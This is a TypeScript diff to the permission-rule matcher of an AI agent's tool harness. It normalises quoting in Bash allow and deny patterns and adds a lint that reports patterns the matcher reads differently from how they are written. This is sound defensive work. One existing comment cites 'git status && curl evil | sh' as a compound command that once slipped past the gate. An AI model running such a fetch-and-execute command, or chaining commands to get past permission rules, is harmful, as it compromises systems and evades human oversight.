@@ -3,7 +3,7 @@ import { isReadOnlyShell } from "./readonly-shell";
 import { containmentDeny } from "./containment";
 import { catastrophicDeny, contentSafetyDeny, redirectTargets } from "./safety";
 import type { Logger } from "../obs/logger";
-import { type Decomposed, decomposeBash, refusesAutoApproval } from "./shell-decompose";
+import { type Decomposed, decomposeBash, normalizeBashPattern, refusesAutoApproval } from "./shell-decompose";
 // Type-only: no runtime cycle even though safety-envelope imports globMatch from here.
 import type { SafetyDisposition, SafetyReason } from "./safety-envelope";
 
@@ -173,7 +173,7 @@ export function defaultForMode(mode: PermissionMode, req: PermissionRequest): De
  *  but NOT `git status && curl evil | sh` — a trailing `*` can no longer launder a compound
  *  command past the gate (the whole-command match `^git.*$` used to cover the entire chain). */
 function ruleMatches(rule: string, req: PermissionRequest): boolean {
-  const m = rule.match(/^([A-Za-z_]+)(?:\((.*)\))?$/);
+  const m = rule.match(ALLOW_RULE);
   if (!m) return false;
   const tool = m[1]!;
   const pattern = m[2];
@@ -186,9 +186,64 @@ function ruleMatches(rule: string, req: PermissionRequest): boolean {
     if (refusesAutoApproval(subjects)) return false;
     // an entry with no forms runs no command (`> /dev/null` alone, `command -v git > /dev/null`)
     const run = subjects.commands.filter((c) => c.forms.length > 0);
-    return run.length > 0 && run.every((c) => !c.argsUnknown && c.forms.some((f) => globMatch(pattern, f)));
+    const patterns = bashPatternForms(pattern);
+    return run.length > 0 && run.every((c) => !c.argsUnknown && c.forms.some((f) => globAny(patterns, f)));
   }
   return globMatch(pattern, representativeArg(req));
+}
+
+/** What a rule's pattern is matched as against a Bash command's forms: as written, and as shell words (E-11:
+ *  `Bash(python3 -c 'import x')` names `python3 -c import x`, the form the decomposer gives that command). Either
+ *  suffices, so a rule only gains calls; a pattern already written as the matcher reads commands is one form. */
+export function bashPatternForms(pattern: string): string[] {
+  const words = normalizeBashPattern(pattern);
+  return words === null || words === pattern ? [pattern] : [pattern, words];
+}
+
+export function globAny(patterns: readonly string[], value: string): boolean {
+  return patterns.some((p) => globMatch(p, value));
+}
+
+/** A Bash pattern the matcher reads differently from how it is written, for `hop lint`: `matchedAs` is the form it also
+ *  matches as, or null when its quoting does not balance (it then matches only as written). */
+export interface BashPatternNote {
+  where: string;
+  rule: string;
+  matchedAs: string | null;
+}
+
+/** Every Bash pattern of a HOP's permissions and toolClasses that quoting, escapes or spacing make the matcher read
+ *  differently from how it is written (E-11): the author should write the form the matcher sees. */
+export function bashPatternNotes(profile: {
+  permissions: { allow: readonly string[]; deny: readonly string[] };
+  safety?: { toolClasses: { readOnly: readonly string[]; mutative: readonly string[]; destructive: readonly string[] } };
+}): BashPatternNote[] {
+  const notes: BashPatternNote[] = [];
+  const check = (where: string, rules: readonly string[], patternOf: (rule: string) => string | undefined) => {
+    for (const rule of rules) {
+      const pattern = patternOf(rule);
+      if (pattern === undefined) continue;
+      const matchedAs = normalizeBashPattern(pattern);
+      if (matchedAs !== pattern) notes.push({ where, rule, matchedAs });
+    }
+  };
+  const ofTool = (re: RegExp, names: (tool: string) => boolean) => (rule: string) => {
+    const m = rule.match(re);
+    return m && m[2] !== undefined && names(m[1]!) ? m[2] : undefined;
+  };
+  check("permissions.allow", profile.permissions.allow, ofTool(ALLOW_RULE, (t) => t === "Bash"));
+  check("permissions.deny", profile.permissions.deny, ofTool(DENY_RULE, (t) => toolMatches(t, "Bash")));
+  const tc = profile.safety?.toolClasses;
+  if (tc) {
+    for (const cls of ["readOnly", "mutative", "destructive"] as const) {
+      // a bare entry is a command glob over a Bash command's forms too
+      check(`safety.toolClasses.${cls}`, tc[cls], (rule) => {
+        const m = rule.match(TOOL_CLASS_RULE);
+        return m ? (m[1] === "Bash" ? m[2] : undefined) : rule;
+      });
+    }
+  }
+  return notes;
 }
 
 /** The tool part of a deny rule or an approval entry (P7 1.7): an exact name, or a glob whose only wildcard is `*`,
@@ -197,8 +252,12 @@ function toolMatches(tool: string, name: string): boolean {
   return tool.includes("*") ? globMatch(tool, name) : tool === name;
 }
 
+/** An allow rule: an exact tool name and an optional argument pattern. */
+const ALLOW_RULE = /^([A-Za-z_]+)(?:\((.*)\))?$/;
 /** A deny rule or an approval entry: its tool part (P7's characters and `*`) and an optional argument pattern. */
 const DENY_RULE = /^([A-Za-z0-9_*:.-]+)(?:\((.*)\))?$/;
+/** A toolClasses entry naming a tool (`Bash(terraform apply*)`); any other entry is a bare tool name or command glob. */
+export const TOOL_CLASS_RULE = /^([A-Za-z_]+)\((.*)\)$/;
 
 /**
  * Whether a deny rule (or a publication's approval entry, matched the same way) names this call, and what it matched:
@@ -227,8 +286,9 @@ export function ruleMatch(rule: string, req: PermissionRequest, logger?: Logger)
   if (opaque !== null) return `undecomposable: ${opaque}`;
   for (const c of commands) if (c.bestEffort) logger?.info("bash.rule_opaque", { command: c.forms[c.forms.length - 1]!.slice(0, 200), rule });
   if (pattern === undefined) return commands[0]?.forms[0] ?? "";
+  const patterns = bashPatternForms(pattern);
   for (const c of commands) {
-    const hit = [...c.forms, ...(c.redirected ?? [])].find((f) => globMatch(pattern, f));
+    const hit = [...c.forms, ...(c.redirected ?? [])].find((f) => globAny(patterns, f));
     if (hit !== undefined) return hit;
   }
   return null;
